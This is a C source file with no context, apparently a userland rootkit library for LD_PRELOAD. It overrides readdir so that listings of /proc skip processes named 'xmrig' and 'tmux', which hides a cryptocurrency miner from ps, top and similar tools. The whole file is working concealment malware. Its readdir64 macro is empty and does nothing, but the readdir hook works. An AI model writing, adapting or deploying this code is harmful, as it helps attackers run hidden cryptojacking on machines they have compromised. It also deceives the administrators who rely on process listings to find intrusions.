#define PROCESS_COUNT 2
#define PROCESS_LIST {"xmrig","tmux"}

#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>


static const char* filterProcess[PROCESS_COUNT] = PROCESS_LIST;

int checkFilterProcess(char *processName)
{
  int i;
  for(i=0; i < PROCESS_COUNT; i++)
    if(!strcmp(processName,filterProcess[i]))
      return 1;
  return 0;
}

static int getDirectoryName(DIR* dirp, char* buffer, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char temp[64];
    snprintf(temp, sizeof(temp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(temp, buffer, size);
    if(ret == -1) {
        return 0;
    }

    buffer[ret] = 0;
    return 1;
}

static int getProcessName(char* pid, char* buffer)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char temp[256];
    snprintf(temp, sizeof(temp), "/proc/%s/stat", pid);

    FILE* f = fopen(temp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(temp, sizeof(temp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int u;
    sscanf(temp, "%d (%[^)]s", &u, buffer);
    return 1;
}

#define DECLARE_READDIR(dirent, readdir)
static struct dirent* (*readdirOriginal)(DIR*) = NULL;

struct dirent* readdir(DIR *dirp)
{
    if(readdirOriginal == NULL) {
        readdirOriginal = dlsym(RTLD_NEXT, "readdir");
        if(readdirOriginal == NULL)
        {
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());
        }
    }

    struct dirent* dir;

    while(1)
    {
        dir = readdirOriginal(dirp);
        if(dir) {
            char dirName[256];
            char processName[256];
            if(getDirectoryName(dirp, dirName, sizeof(dirName)) &&
                strcmp(dirName, "/proc") == 0 &&
                getProcessName(dir->d_name, processName) &&
                checkFilterProcess(processName) ) {
                continue;
            }
        }
        break;
    }
    return dir;
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
